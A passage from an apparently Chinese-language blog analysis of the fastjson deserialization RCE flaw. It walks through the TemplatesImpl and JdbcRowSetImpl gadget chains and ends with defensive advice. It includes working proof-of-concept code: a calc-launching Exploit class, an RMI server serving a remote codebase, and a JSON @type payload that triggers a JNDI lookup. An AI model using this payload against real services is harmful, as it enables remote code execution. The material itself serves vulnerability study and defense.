+    <span class="keyword">private</span> <span class="keyword">transient</span> ThreadLocal _sdom = <span class="keyword">new</span> ThreadLocal();
+    <span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;
+
+    <span class="keyword">protected</span> TemplatesImpl(<span class="keyword">byte</span>[][] bytecodes, String transletName, Properties outputProperties, <span class="keyword">int</span> indentNumber, TransformerFactoryImpl tfactory) {
+        <span class="keyword">this</span>._bytecodes = bytecodes;
+        <span class="keyword">this</span>._name = transletName;
+        <span class="keyword">this</span>._outputProperties = outputProperties;
+        <span class="keyword">this</span>._indentNumber = indentNumber;
+        <span class="keyword">this</span>._tfactory = tfactory;
+    }
+
+    <span class="keyword">protected</span> TemplatesImpl(Class[] transletClasses, String transletName, Properties outputProperties, <span class="keyword">int</span> indentNumber, TransformerFactoryImpl tfactory) {
+        <span class="keyword">this</span>._class = transletClasses;
+        <span class="keyword">this</span>._name = transletName;
+        <span class="keyword">this</span>._transletIndex = <span class="number">0</span>;
+        <span class="keyword">this</span>._outputProperties = outputProperties;
+        <span class="keyword">this</span>._indentNumber = indentNumber;
+        <span class="keyword">this</span>._tfactory = tfactory;
+    }
+
+    <span class="keyword">public</span> TemplatesImpl() {
+    }
+    ....
+
+    <span class="keyword">public</span> <span class="keyword">synchronized</span> Properties getOutputProperties() {
+        <span class="keyword">try</span> {
+            <span class="keyword">return</span> <span class="keyword">this</span>.newTransformer().getOutputProperties();
+        } <span class="keyword">catch</span> (TransformerConfigurationException var<span class="number">2</span>) {
+            <span class="keyword">return</span> <span class="keyword">null</span>;
+        }
+    }
+    ···
+
+}
+</code></pre>
+
+<p>结合poc来看，_outputProperties拥有Getter，但是Getter有点不符合标准格式，好在fastjson可以智能搞定，由于Properties实现了Map，所有getOutputProperties()会被调用。</p>
+
+<p><img src=18.png></img></p>
+
+<p><img src=19.png></img></p>
+
+<p>继续查看newTransformer()方法。</p>
+
+<p><img src=20.png></img></p>
+
+<p><img src=21.png></img></p>
+
+<p><img src=22.png></img></p>
+
+<p>如此一来，PoC触发过程就明朗了：(此处盗图一张)</p>
+
+<p><img src=23.png></img></p>
+
+<p>由于上述PoC用到了_name,_bytecodes等private成员，所有需要在parseObject()时设置Feature.SupportNonPublicField，如果不设置，由于_name等为null，将导致后面的NullPointerException。所有，很多人以为fastjson RCE需要程序写出如下模式的代码才会存在漏洞，从而低估了这个漏洞。<b>(后面讲到其他的poc根本没这限制)</b></p>
+
+<pre><code class="java">
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String args[]){
+        <span class="keyword">try</span> {
+              Object obj = JSON.parseObject(text<span class="number">1</span>, Object.class,config,Feature.SupportNonPublicField);
+        } <span class="keyword">catch</span> (Exception e) {
+            e.printStackTrace();
+        } 
+    }
+
+</code></pre>
+
+<h2>3.2 基于JNDI的PoC</h2>
+
+<p>在之前分享的java反序列化漏洞(原生篇)的时候，曾经简单介绍了一个基于Spring组件库漏洞的PoC，主要是由于一些列调用之后导致了lookup()方法的参数可控，从而导致RCE。本次基于JDNI的PoC和此稍微有点类似，最终都回归到lookup()参数可以被攻击者控制。</p>
+
+<h3>3.2.1 JNDI简介</h3>
+
+<p>JNDI为调用远程java对象提供了可能，具体定义这里不多做解释，可自行Google。这里从16年的BlackHat上盗图一张，简单说明JNDI的架构。</p>
+
+<p><img src=24.png></img></p>
+
+<p>最底层的是具体实现机制，例如RMI，LDAP等。以下对RMI使用做简单介绍，具体可参考http://damies.iteye.com/blog/51778。通常的使用架构大致如下：</p>
+
+<p><img src=25.png></img></p>
+
+<p>从代码角度做下测试，首先是远程环境下的类,将其编译放在能web访问的目录下，我将Exploit.class放在了tomcat的跟目录下,我的http端口是8888：</p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> {</span>
+    <span class="keyword">public</span> Exploit(){
+        <span class="keyword">try</span>{
+            Runtime.getRuntime().exec(<span class="string">"calc"</span>);
+        }<span class="keyword">catch</span>(Exception e){
+            e.printStackTrace();
+        }
+    }
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] argv){
+        Exploit e = <span class="keyword">new</span> Exploit();
+    }
+}
+
+</code></pre>
+
+<p>然后开启RMI服务，使用端口1099：</p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> {</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> start() <span class="keyword">throws</span>
+            AlreadyBoundException, RemoteException, NamingException {
+        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);
+        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exploit"</span>,
+                <span class="string">"Exploit"</span>,<span class="string">"http://127.0.0.1:8888/"</span>);
+        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);
+        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);
+
+    }
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> RemoteException,NamingException,AlreadyBoundException{
+        start();
+    }
+}
+
+</code></pre>
+
+<p>最后，从客户端连接RMI，然后就能远程加载Exploit对象了。</p>
+
+<pre><code class="java">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> testRmi() <span class="keyword">throws</span> NamingException {
+        String url = <span class="string">"rmi://127.0.0.1:1099"</span>;
+        Hashtable env = <span class="keyword">new</span> Hashtable();
+        env.put(Context.PROVIDER_URL, url);
+        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);
+        Context context = <span class="keyword">new</span> InitialContext(env);
+<span class="comment">//        Object object = context.lookup("Exploit");//ok</span>
+        Object object<span class="number">1</span> = context.lookup(<span class="string">"rmi://127.0.0.1/Exploit"</span>);
+        System.out.println(<span class="string">"Object:"</span> + object<span class="number">1</span>);
+    }
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] argv) <span class="keyword">throws</span> NamingException {
+<span class="comment">//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");</span>
+        testRmi();
+
+    }
+</code></pre>
+
+<p>运行测试代码，Exploit类构造器执行，计算器被弹出。</p>
+
+<h3>3.2.2 PoC</h3>
+
+<p>PoC基于JdbcRowSetImpl，在JDK 6u132, 7u122, or 8u113以上被修补。我们看下JdbcRowSetImpl类：</p>
+
+<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImpl</span> <span class="keyword">extends</span> <span class="title">BaseRowSet</span> <span class="keyword">implements</span> <span class="title">JdbcRowSet</span>, <span class="title">Joinable</span> {</span>
+    <span class="keyword">private</span> Connection conn;
+    <span class="keyword">private</span> PreparedStatement ps;
+    <span class="keyword">private</span> ResultSet rs;
+    <span class="keyword">private</span> RowSetMetaDataImpl rowsMD;
+    <span class="keyword">private</span> ResultSetMetaData resMD;
+    <span class="keyword">private</span> Vector&lt;Integer&gt; iMatchColumns;
+    <span class="keyword">private</span> Vector&lt;String&gt; strMatchColumns;
+    <span class="keyword">protected</span> <span class="keyword">transient</span> JdbcRowSetResourceBundle resBundle;
+    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3591946023893483003</span>L;
+    ···
+</code></pre>
+
+<p>根据fastjson反序列化机制，将先反序列化BaseRowSet基类，基类中有setDataSourceName()的public Setter：</p>
+
+<pre><code class="java">    <span class="keyword">public</span> <span class="keyword">void</span> setDataSourceName(String name) <span class="keyword">throws</span> SQLException {
+
+        <span class="keyword">if</span> (name == <span class="keyword">null</span>) {
+            dataSource = <span class="keyword">null</span>;
+        } <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">""</span>)) {
+           <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="string">"DataSource name cannot be empty string"</span>);
+        } <span class="keyword">else</span> {
+           dataSource = name;
+        }
+
+        URL = <span class="keyword">null</span>;
+    }
+</code></pre>
+
+<p>然后反序列化JdbcRowSetImpl类，其中有个setAutoCommit()的public Setter：</p>
+
+<pre><code class="java">    <span class="keyword">public</span> <span class="keyword">void</span> setAutoCommit(<span class="keyword">boolean</span> var<span class="number">1</span>) <span class="keyword">throws</span> SQLException {
+        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) {
+            <span class="keyword">this</span>.conn.setAutoCommit(var<span class="number">1</span>);
+        } <span class="keyword">else</span> {
+            <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();
+            <span class="keyword">this</span>.conn.setAutoCommit(var<span class="number">1</span>);
+        }
+
+    }
+</code></pre>
+
+<p>当反序列化时，json数据中如果存在dataSourceName和autoCommit字段，则上述Setter会被调用。</p>
+
+<p>我们继续看下connect()方法：</p>
+
+<pre><code class="java">  <span class="keyword">private</span> Connection connect() <span class="keyword">throws</span> SQLException {
+        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) {
+            <span class="keyword">return</span> <span class="keyword">this</span>.conn;
+        } <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) {
+            <span class="keyword">try</span> {
+                InitialContext var<span class="number">1</span> = <span class="keyword">new</span> InitialContext();
+                DataSource var<span class="number">2</span> = (DataSource)var<span class="number">1</span>.lookup(<span class="keyword">this</span>.getDataSourceName());
+                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var<span class="number">2</span>.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var<span class="number">2</span>.getConnection();
+            } <span class="keyword">catch</span> (NamingException var<span class="number">3</span>) {
+                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());
+            }
+        } <span class="keyword">else</span> {
+            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;
+        }
+    }
+</code></pre>
+
+<p>可以看到，lookup()的参数正是来自dataSourceName，来自反序列化数据。柳暗花明~~~poc如下：</p>
+
+<pre><code class="java">
+<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> {</span>
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] argv){
+<span class="comment">//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");</span>
+
+        testJdbcRowSetImpl();
+    }
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> testJdbcRowSetImpl(){           
+       String payload = <span class="string">"{\"@type\"\"com.sun.rowset.JdbcRowSetImpl\"\"dataSourceName\":\"rmi://localhost:1099/Exploit\","</span> +
+                <span class="string">" \"autoCommit\":true}"</span>;
+        JSON.parse(payload);
+    }
+
+}
+
+</code></pre>
+
+<p>回顾下整个控制流：</p>
+
+<p>parseObject()/parse()----&gt;setValue()-----&gt;setDataSourceName----&gt;setAutoCommit()----&gt;connect()-----&gt;lookup()。</p>
+
+<h2>3.3 其他PoC</h2>
+
+<p>后续更加系统地分析PoC。。。。</p>
+
+<p>很多反序列化问题的入口都是Setter,Getter,hashCode(),equals(),toString()。</p>
+
+<p></p>
+
+<p></p>
+
+<h1>4. 防御</h1>
+
+<p>参考官方安全公告：https://github.com/alibaba/fastjson/wiki/security_update_20170315</p>
+
+<p>(1) 升级fastjson至1.2.25及以上，其添加了黑名单类；</p>
+
+<p>(2) 不要手贱开启autotype来反序列化任意类。</p>
+
+</body>
+</html>
